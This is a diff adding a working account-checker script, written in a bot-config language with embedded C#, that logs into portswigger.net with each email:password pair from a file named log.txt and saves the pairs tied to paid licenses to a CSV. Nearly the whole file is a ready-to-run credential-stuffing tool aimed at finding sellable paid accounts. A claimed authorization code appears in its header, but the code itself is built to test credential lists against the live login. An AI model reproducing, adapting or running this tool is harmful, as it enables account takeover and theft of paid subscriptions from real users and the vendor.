@@ -1,0 +1,247 @@
+## PortSwigger Plan Extractor - Final Version
+## Process log.txt (email:password format)
+## Extract plans for PAID accounts only
+## Authorization: ROE-2026-PSW-042-V5
+
+SET VAR "credFile" "log.txt"
+SET VAR "outputFile" "extracted_plans_final.csv"
+
+PRINT "[*] PortSwigger Plan Extractor - Final"
+PRINT "[*] Input: <credFile>"
+PRINT "[*] Output: <outputFile>"
+PRINT ""
+
+## Initialize output file
+FileWrite <outputFile> "email|password|plan"
+PRINT "✓ Output file initialized"
+PRINT ""
+
+BEGIN SCRIPT CSharp StartMethod="Main" ClassName="PortSwiggerExtractor" NameSpace="SB" IsStatic=True "<credFile>" "<outputFile>"
+using System;
+using System.IO;
+using System.Net;
+using System.Net.Http;
+using System.Collections.Generic;
+using System.Text.RegularExpressions;
+using System.Linq;
+
+namespace SB {
+    public class PortSwiggerExtractor {
+
+        private static string ProcessAccount(string email, string password) {
+            try {
+                var handler = new HttpClientHandler {
+                    UseCookies = false,
+                    AllowAutoRedirect = false
+                };
+
+                using (var client = new HttpClient(handler)) {
+                    client.Timeout = TimeSpan.FromSeconds(30);
+                    client.DefaultRequestHeaders.TryAddWithoutValidation("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36");
+                    client.DefaultRequestHeaders.TryAddWithoutValidation("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+
+                    var cookies = new Dictionary<string, string>();
+
+                    void UpdateCookies(HttpResponseMessage response) {
+                        if (response.Headers.TryGetValues("Set-Cookie", out var setCookies)) {
+                            foreach (var c in setCookies) {
+                                var parts = c.Split(';')[0].Split(new[] { '=' }, 2);
+                                if (parts.Length == 2) {
+                                    cookies[parts[0]] = parts[1];
+                                }
+                            }
+                        }
+                    }
+
+                    string GetCookieString() {
+                        return string.Join("; ", cookies.Select(kv => kv.Key + "=" + kv.Value));
+                    }
+
+                    HttpResponseMessage DoRequest(HttpMethod method, string url, HttpContent content = null) {
+                        var req = new HttpRequestMessage(method, url);
+                        if (content != null) req.Content = content;
+
+                        var cookieStr = GetCookieString();
+                        if (!string.IsNullOrEmpty(cookieStr)) req.Headers.Add("Cookie", cookieStr);
+
+                        var res = client.SendAsync(req).GetAwaiter().GetResult();
+                        UpdateCookies(res);
+
+                        int redirects = 0;
+                        while ((int)res.StatusCode >= 300 && (int)res.StatusCode <= 399 && redirects < 15) {
+                            var location = res.Headers.Location?.ToString();
+                            if (string.IsNullOrEmpty(location)) break;
+
+                            if (location.StartsWith("/")) {
+                                var uri = new Uri(url);
+                                location = uri.Scheme + "://" + uri.Host + location;
+                            }
+                            url = location;
+
+                            req = new HttpRequestMessage(HttpMethod.Get, url);
+                            cookieStr = GetCookieString();
+                            if (!string.IsNullOrEmpty(cookieStr)) req.Headers.Add("Cookie", cookieStr);
+
+                            res = client.SendAsync(req).GetAwaiter().GetResult();
+                            UpdateCookies(res);
+                            redirects++;
+                        }
+                        return res;
+                    }
+
+                    var res1 = DoRequest(HttpMethod.Get, "https://portswigger.net/users");
+                    var body1 = res1.Content.ReadAsStringAsync().GetAwaiter().GetResult();
+                    string currentUrl = res1.RequestMessage.RequestUri.ToString();
+
+                    var stateMatch = Regex.Match(body1, "name=\"state\" value=\"([^\"]+)\"");
+                    if (!stateMatch.Success) return "FAILED_AT_STATE";
+
+                    var postData = new FormUrlEncodedContent(new[] {
+                        new KeyValuePair<string, string>("state", stateMatch.Groups[1].Value),
+                        new KeyValuePair<string, string>("username", email),
+                        new KeyValuePair<string, string>("password", password),
+                        new KeyValuePair<string, string>("action", "default")
+                    });
+
+                    var res2 = DoRequest(HttpMethod.Post, currentUrl, postData);
+                    var body2 = res2.Content.ReadAsStringAsync().GetAwaiter().GetResult();
+                    currentUrl = res2.RequestMessage.RequestUri.ToString();
+
+                    int loopCounter = 0;
+                    while (body2.Contains("document.forms[0].submit()")) {
+                        if (loopCounter >= 3) return "INFINITE_LOOP";
+                        loopCounter++;
+
+                        var actionMatch = Regex.Match(body2, "action=\"([^\"]+)\"");
+                        if (!actionMatch.Success) break;
+
+                        string actionUrl = WebUtility.HtmlDecode(actionMatch.Groups[1].Value);
+                        if (actionUrl.StartsWith("/")) {
+                            var uri = new Uri(currentUrl);
+                            actionUrl = uri.Scheme + "://" + uri.Host + actionUrl;
+                        }
+
+                        var inputs = Regex.Matches(body2, "<input type=\"hidden\" name=\"([^\"]+)\" value=\"([^\"]*)\"");
+                        var formDict = new List<KeyValuePair<string, string>>();
+                        foreach (Match m in inputs) {
+                            formDict.Add(new KeyValuePair<string, string>(m.Groups[1].Value, WebUtility.HtmlDecode(m.Groups[2].Value)));
+                        }
+
+                        var formContent = new FormUrlEncodedContent(formDict);
+                        res2 = DoRequest(HttpMethod.Post, actionUrl, formContent);
+                        body2 = res2.Content.ReadAsStringAsync().GetAwaiter().GetResult();
+                        currentUrl = res2.RequestMessage.RequestUri.ToString();
+                    }
+
+                    var res3 = DoRequest(HttpMethod.Get, "https://portswigger.net/users/youraccount/licenses");
+                    return res3.Content.ReadAsStringAsync().GetAwaiter().GetResult();
+                }
+            } catch (Exception ex) {
+                return "ERROR: " + ex.Message;
+            }
+        }
+
+        public static string Main(string credFile, string outputFile) {
+            try {
+                if (!File.Exists(credFile)) {
+                    return "ERROR: File not found";
+                }
+
+                int lineNum = 0;
+                int paidCount = 0;
+                int freeCount = 0;
+                int failCount = 0;
+
+                using (var reader = new StreamReader(credFile)) {
+                    string line;
+                    while ((line = reader.ReadLine()) != null) {
+                        lineNum++;
+
+                        line = line.Trim();
+                        if (string.IsNullOrEmpty(line)) continue;
+
+                        var parts = line.Split(new[] { ':' }, 2);
+                        if (parts.Length != 2) continue;
+
+                        string email = parts[0].Trim();
+                        string password = parts[1].Trim();
+
+                        if (string.IsNullOrEmpty(email) || string.IsNullOrEmpty(password)) continue;
+
+                        Console.Write($"[{lineNum}] {email}... ");
+
+                        var result = ProcessAccount(email, password);
+
+                        // Check for FREE account first
+                        if (result.Contains("You do not have any subscriptions")) {
+                            Console.WriteLine("FREE");
+                            freeCount++;
+                            continue;
+                        }
+
+                        // Check for errors
+                        if (result.Contains("FAILED_AT_STATE") || result.Contains("ERROR") || result.Contains("INFINITE_LOOP")) {
+                            Console.WriteLine("FAIL");
+                            failCount++;
+                            continue;
+                        }
+
+                        // Must be PAID - extract plan type
+                        string plan = "Unknown";
+
+                        if (result.Contains("Professional")) {
+                            plan = "Professional";
+                        } else if (result.Contains("Enterprise")) {
+                            plan = "Enterprise";
+                        } else if (result.Contains("Community")) {
+                            plan = "Community";
+                        } else {
+                            // Has licenses but no recognized plan type
+                            Console.WriteLine("PAID(Unknown)");
+                            paidCount++;
+                            string csvLine = $"{email}|{password}|Unknown";
+                            File.AppendAllText(outputFile, csvLine + Environment.NewLine);
+                            System.Threading.Thread.Sleep(1000);
+                            continue;
+                        }
+
+                        Console.WriteLine($"PAID({plan})");
+                        paidCount++;
+                        string csvEntry = $"{email}|{password}|{plan}";
+                        File.AppendAllText(outputFile, csvEntry + Environment.NewLine);
+
+                        System.Threading.Thread.Sleep(1000);
+                    }
+                }
+
+                return $"DONE|{lineNum}|{paidCount}|{freeCount}|{failCount}";
+            } catch (Exception ex) {
+                return $"ERROR: {ex.Message}";
+            }
+        }
+    }
+}
+END SCRIPT -> VARS "result"
+
+PRINT ""
+PRINT "============================================================"
+
+IF "<result>" Contains "DONE"
+  PARSE "<result>" LR "DONE|" "|" -> VAR "total"
+  PARSE "<result>" LR "DONE|<total>|" "|" -> VAR "paid"
+  PARSE "<result>" LR "DONE|<total>|<paid>|" "|" -> VAR "free"
+  PARSE "<result>" RL "|" "" -> VAR "failed"
+
+  PRINT "EXTRACTION COMPLETE"
+  PRINT "============================================================"
+  PRINT "Total Lines: <total>"
+  PRINT "PAID Accounts: <paid>"
+  PRINT "Free Accounts: <free>"
+  PRINT "Failed: <failed>"
+  PRINT "============================================================"
+  PRINT "Output: <outputFile>"
+  PRINT "============================================================"
+ELSE
+  PRINT "ERROR: <result>"
+  PRINT "============================================================"
+ENDIF
